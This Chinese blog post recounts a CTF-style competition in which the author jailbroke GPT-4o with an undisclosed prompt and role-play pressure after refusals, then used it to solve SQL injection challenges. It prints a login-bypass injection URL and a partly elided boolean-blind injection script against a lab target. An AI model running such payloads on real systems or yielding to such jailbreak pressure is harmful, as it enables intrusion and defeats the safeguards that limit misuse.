---
title: 如果将大模型用于黑客攻击？
date: 2024-08-17 19:22:00
type: post
blog: true
description: 近被好友拉去参加一个类似 CTF 的理论加实践竞赛，期间发现 gpt 在这种场合出奇的强大。
tags:
    - LLM
    - 黑客攻击
    - 安全
    - 大模型越狱
---

楔子
--

  

黑客是指充满好奇和探索精神，具备进入别人系统能力，但却不用于非法的群体，他们可以是[白帽子](https://zhida.zhihu.com/search?q=%E7%99%BD%E5%B8%BD%E5%AD%90&zhida_source=entity&is_preview=1)、渗透测试安全员等技术爱好者；而[骇客](https://zhida.zhihu.com/search?q=%E9%AA%87%E5%AE%A2&zhida_source=entity&is_preview=1)指将技术用于获取非法信息，以此牟利。由于媒体传播原因，通常使用黑客来描述后者。本文的黑客指在合法授权下的技术群体。

笔者并非专业安全人员，但最近被好友拉去参加一个类似 CTF 的理论加实践竞赛，期间发现 gpt 在这种场合出奇的强大 。我们的赛事理论是攻防安全知识，实践则是靶机夺旗赛。三人一组，实践 10 道题目，[开卷考试](https://zhida.zhihu.com/search?q=%E5%BC%80%E5%8D%B7%E8%80%83%E8%AF%95&zhida_source=entity&is_preview=1)，一周时间。笔者本身是并未关注过这个比赛，本着不好意思拒绝，被拉去凑人数的心理参加了。但直到临近还有两天结束的周五下班时刻，被队员安利周末一起看题目。由于个人周六有私事，就准备在公司吃饭后做题，打开系统发现我们队（队员大多都不是安全相关的同学）还没有拿到任何一个 flag（攻破）。

基于 LLM 发起黑客攻击
-------------

对于生活和工作离不开 gpt 的我而言，第一时间测试了 gpt4o 和 sonnet3.5，毫无悬念，询问任何向目标网站发起 SQL 注入到方案和实施细节的时候，全部都是拒绝了。

尝试了网传最新版本的 DAN 越狱提示词，也失效。为了能加速拿到 flag 的效率，顺利通关，对个人私藏未公开一个越狱方式稍加修改，竟然成功让 gpt4o 在内的模型能协助发起攻击。最终结果是没有利用任何暴破工具下，快速解答 3 题目，到周日再解答4题（剩下的未继续解答了，已达到了入围条件），一个人把大多数系统都突破了，最终成功入围决赛。

说实话，我也惊呆了，毕竟我从未参加过这类比赛，也不懂任何答题套路。从题目来看，大多是日常漏洞，但对一个非专业安全而言，还是有一定准入门槛和成本。基于大模型，成本几乎降低到有手就行。

我举一个典型的渗透测试题目：SQL 注入。

题目大概是这样的:

_名称: 猜猜有什么[注入漏洞](https://zhida.zhihu.com/search?q=%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&zhida_source=entity&is_preview=1)_

_靶机目标: xxx ip port。_

打开目标ip 和端口，是一个登陆网页。随机测试登陆会失败。这个题目很明显，就是如何通过 [sql注入](https://zhida.zhihu.com/search?q=sql%E6%B3%A8%E5%85%A5&zhida_source=entity&is_preview=1)，进入到别人的数据库，拿到 flag 信息。

大多数人应该可以通过搜索引擎查询如何拼接方案。

```
http://172.21.148.2:10031/login?username=admin&password=anything%27%20OR%20%271%27=%271
```

上面是大模型直接拼接返回的一个 url ，无需网络查询和自己动手，发起请求后，一次性返回 login successfull 。但没跳转，接下来我应该怎么做？怎么样才能拿到数据库信息？

我能想得到是测试各种注入到 SQL 拼接进 URL，做体力活了。我让 gpt4o 返回了几个测试查询数据库和表的 SQL 进行拼接，复制黏贴到浏览器请求，但似乎都是 500 失败。

这个时候，其实有一定难度和门槛了，假设让我网上搜索各种资料，只能到这一步，且时间只会更久。

接下来，进入高级时刻，提示词开始 pua gpt4o，让他模拟充当一个渗透测试专家，使用更高级的注入方案。  

瞬间，gpt4o 生成了两个几百行的 js 脚本（我在浏览器内测试的），里面解释分别是布尔盲注和时间盲注，目标靶机等信息全部在，我复制其中一个直接粘贴到控制台。

```
const baseUrl = 'http://172.xx.xx.2:10031/login';const basePasswordPayload = "anything' OR '1'='1";const expectedResult = 'Login successful!';// 布尔盲注函数async function booleanBlind(payload, expectedResult) {const fullPayload = \`username=${encodeURIComponent(payload)}&password=${encodeURIComponent(basePasswordPayload)}\`;try {const response = await fetch(baseUrl, {method: 'POST',headers: {'Content-Type': 'application/x-www-form-urlencoded'},body: fullPayload});const result = await response.text();return result.includes(expectedResult);} catch (error) {console.error(\`Error:\`, error);return false;}}// 查找所有列名（逐字逐字符）async function findAllColumnNames(tableName) {let columnNames = \[\];let columnIndex = 0;while (true) {let columnName = '';for (let i = 1; i <= 32; i++) { // 假设列名最长为32个字符已省略细节}}if (!found) break;}if (columnName) {columnNames.push(columnName);console.log(\`Found column: ${columnName}\`);columnIndex++;} else {break;}}return columnNames;}// 查找flag值（逐字逐字符）async function findFlagValue(tableName, columnName) {let flagValue = '';for (let i = 1; i <= 64; i++) { // 假设flag值最长为64个字符 省略了细节}if (!found) break;}console.log(\`Flag Value: ${flagValue}\`);return flagValue;}// 运行程序(async () => {const tableName = 'flag_table';const columnNames = await findAllColumnNames(tableName);for (const columnName of columnNames) {const flagValue = await findFlagValue(tableName, columnName);console.log(\`Column: ${columnName}, Value: ${flagValue}\`);}})();
```

好家伙，批量发起了 http 请求，并自动解析响应判断和打印字符，大概请求了几百次，不到一分钟，基于布尔盲注在控制台打印出来了数据库名。

接下来，继续让 gpt 用同样的方法，给注入查询表名的 js 脚本，又一次性成功，拿到表名，最后再次让生成注入查表内信息脚本，看到了 flag 信息。

整个过程，零手写代码编写，全程自然语言，没有任何专业的注入工具，仅在一个浏览器里完成。

到此刻我已经震惊了，也感到非常的兴奋。接下来的时间，其他的渗透测试题也是用这样的方案逐一攻破的。

攻防博弈升级
------

在没有大模型之前，黑客有一定准入门槛。他必须熟悉计算机基础知识，了解网络安全，即懂防也懂攻的技术套路。这些知识兼具广度和深度，让成为一名黑客所需要的学习成本相对较高。

然而顶级的大模型，学习吸纳了公开领域几乎所有的计算机和安全知识，能通过自然语言，轻而易举的构造各种高级的攻击手法，这极大降低了攻击成本。去年 [chatgpt](https://zhida.zhihu.com/search?q=chatgpt&zhida_source=entity&is_preview=1) 出现后，就被曝出大量用于非法网络攻击，极大降低了门槛，但这次经历让我有了个人的体验。虽然大模型在微调阶段会做大量安全对齐，以防止非法使用，但从去年到今年截止目前，绕过大模型的“越狱”策略一直有，网传的 DAN 提示词，都已经更新到13个版本了，还有其他各种绕过安全道德限制的提示词，加上还有各种开源未安全对齐的模型，完全杜绝大模型进入非法攻击是几乎不可能。

那是否意味着大模型增加了整个网络体系则不安全性呢？并非如此。大模型在让攻击变得更加容易的同时，反过来也让防御变得更加的简单。现在有越来越多的软件系统是由大模型生成的代码，以及大模型协助 SDL 安全设计。也就是即使是新手，也能在大模型的加持下设计出更安全的软件系统。由于大模型普遍对攻击内容做了限制，但防御却是完整支持的，这让使用主流的大模型进行防御变得更轻松。

软件安全中，人是最核心要素，也不是最不安全的要素，人工智能的出现，仅仅只是扩大了双方的势力。攻防博弈并不会因为大模型而产生根本性变化，始终存在，也不会消亡。

结
-

上面的全部操作都是在合规合法的内部渗透测试中进行，无任何恶意行为。

本文不分享任何绕过道德限制的越狱提示词，也不会对具体的渗透测试进行讲解。任何想要发起渗透测试的同学，请在合规合法的前提下进行。